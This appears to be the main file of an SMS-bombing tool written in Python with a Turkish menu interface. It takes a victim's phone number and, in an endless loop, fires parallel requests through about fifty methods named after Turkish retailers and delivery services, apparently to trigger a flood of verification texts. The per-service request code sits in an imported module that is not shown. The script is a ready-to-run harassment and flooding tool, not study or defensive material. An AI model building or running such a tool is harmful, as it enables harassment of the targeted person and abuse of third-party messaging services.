from colorama import Fore, Style, init
init(autoreset=True)
from time import sleep
from os import system
from sms import SendSms
from concurrent.futures import ThreadPoolExecutor, wait
import threading
import fade
import time

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)





ascii_yazi = r"""
     ▄▄▄        ██████▓██   ██▓ ▄▄▄         |\---/|
    ▒████▄    ▒██    ▒ ▒██  ██▒▒████▄       | o_o |
    ▒██  ▀█▄  ░ ▓██▄    ▒██ ██░▒██  ▀█▄      \_^_/
    ░██▄▄▄▄██   ▒   ██▒ ░ ▐██▓░░██▄▄▄▄██ 
     ▓█   ▓██▒▒██████▒▒ ░ ██▒▓░ ▓█   ▓██▒
     ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ██▒▒▒  ▒▒   ▓▒█░
      ▒   ▒▒ ░░ ░▒  ░ ░▓██ ░▒░   ▒   ▒▒ ░
      ░   ▒   ░  ░  ░  ▒ ▒ ░░    ░   ▒   
          ░  ░      ░  ░ ░           ░  ░
                       ░ ░               
"""


kedi = r"""
          |\      _,,,---,,_
    ZZZzz /,`.-'`'    -.  ;-;;,_
         |,4-  ) )-,_. ,\ (  `'-'
        '---''(_/--'  `-'\_)  Kedi uyandırılıyor...
"""

kedi1 = r"""
     _._     _,-'""`-._
    (,-.`._,'(       |\`-/|     Kedi UYANDI!
        `-.-' \ )-`( , o o)
              `-    \`_`"'-
"""


def titresim():
    titresim_is = threading.Thread(target=system, args=["termux-vibrate -d 350 -f"])
    titresim_is.start()

system("cls||clear")
print(fade.blackwhite(kedi))
titresim
time.sleep(5)
system("cls||clear")
print(fade.blackwhite(kedi1))
time.sleep(3)

while 1:
    system("cls||clear")
    print(fade.pinkred(ascii_yazi))
    try:
        print("""

    0|  CIKIS
    
    1|  Basla!
    2|  YARDIMMM

""")
        menu = input(" $ " + Fore.MAGENTA)
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue
    if menu == 0:
        system("cls||clear")
        print("Gorusurruuzz")
        exit()
    elif menu == 2:
        system("cls||clear")
        print("wp den yazzz")
        print("Bu ekran 4.1 saniye icinde kayıplara krisacakk.")
        time.sleep(4.1)
        
    elif menu == 1:
        system("cls||clear")
        tel_no = input("Telefon numarasını basındaki 90 olmadan yaz : " + Fore.MAGENTA)
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print("Malll yanlıs girdin") 
            sleep(3)
            continue
        system("cls||clear")
        mail = ""
        send_sms = SendSms(tel_no, mail)
        try:
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = [
                        executor.submit(send_sms.Akasya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(send_sms.Beefull),
                        executor.submit(send_sms.Bim),
                        executor.submit(send_sms.Bisu),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(send_sms.Clickme),
                        executor.submit(send_sms.Dominos),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Hizliecza),
                        executor.submit(send_sms.Icq),
                        executor.submit(send_sms.Ipragaz),
                        executor.submit(send_sms.Istegelsin),
                        executor.submit(send_sms.Joker),
                        executor.submit(send_sms.KahveDunyasi),
                        executor.submit(send_sms.KimGb),
                        executor.submit(send_sms.Komagene),
                        executor.submit(send_sms.Koton),
                        executor.submit(send_sms.KuryemGelsin),
                        executor.submit(send_sms.Macro),
                        executor.submit(send_sms.Metro),
                        executor.submit(send_sms.Migros),
                        executor.submit(send_sms.Naosstars),
                        executor.submit(send_sms.Paybol),
                        executor.submit(send_sms.Pidem),
                        executor.submit(send_sms.Porty),
                        executor.submit(send_sms.Qumpara),
                        executor.submit(send_sms.Starbucks),
                        executor.submit(send_sms.Suiste),
                        executor.submit(send_sms.Taksim),
                        executor.submit(send_sms.Tasdelen),
                        executor.submit(send_sms.Tasimacim),
                        executor.submit(send_sms.Tazi),
                        executor.submit(send_sms.TiklaGelsin),
                        executor.submit(send_sms.ToptanTeslim),
                        executor.submit(send_sms.Ucdortbes),
                        executor.submit(send_sms.Uysal),
                        executor.submit(send_sms.Wmf),
                        executor.submit(send_sms.Yapp),
                        executor.submit(send_sms.YilmazTicaret),
                        executor.submit(send_sms.Yuffi)
                    ]
                    wait(futures)
        except KeyboardInterrupt:
            system("cls||clear")
            print("\nCtrl+C BASTI ölüyoum....")
            exit()
